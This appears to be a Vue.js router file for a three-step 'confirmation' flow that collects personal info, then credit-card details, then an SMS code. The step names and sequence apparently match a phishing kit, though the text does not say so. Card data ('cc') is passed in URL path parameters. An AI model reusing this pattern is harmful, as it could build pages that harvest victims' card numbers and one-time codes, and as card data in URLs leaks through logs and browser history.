import Vue from "vue";
import Router from "vue-router";
Vue.use(Router);
export default new Router({
  mode: "history",
  routes: [
    {
      path: "/",
      redirect: "/infos-confirmation",
    },
    {
      index: 0,
      path: "/infos-confirmation",
      name: "infos",
      component: () => import("./components/one-comp.vue"),
    },
    {
      index: 1,
      path: "/credit-card-infos-confirmation/:infos",
      name: "credit-card",
      component: () => import("./components/two-comp.vue"),
    },
    {
      index: 2,
      path: "/sms-confirmation/:infos/:cc",
      name: "sms",
      component: () => import("./components/four-comp.vue"),
    },
    {
      path: "*",
      redirect: "/infos-confirmation",
    },
  ],
});
